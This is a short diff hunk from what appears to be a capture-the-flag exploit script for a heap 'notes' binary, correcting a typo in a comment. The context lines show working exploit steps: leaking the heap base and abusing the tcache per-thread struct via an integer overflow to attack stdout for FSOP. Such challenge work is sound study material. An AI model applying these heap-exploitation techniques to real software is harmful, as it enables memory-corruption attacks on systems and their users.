@@ -49,7 +49,7 @@ create_note(0, b'18', b'0'*0x10) # heap_base_addr+0x1020
 heap_base_addr = u64(view_note(0)[0x10:].ljust(8, b'\x00'))-0x1010 # heap_base_addr+0x1020
 log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Stage 3: exploit tcache perthread struct through integer overflow to attach stdout for fsop
+# Stage 3: exploit tcache perthread struct through integer overflow to attack stdout for fsop
 create_note(2, b'18', p64(heap_base_addr+0x1440)) # heap_base_addr+0x1040
 free_note(((heap_base_addr+0x1040)-(elf_base_addr+e.symbols['notes']))//8) # heap_base_addr+0x1440
 class TcachePerthreadStruct:
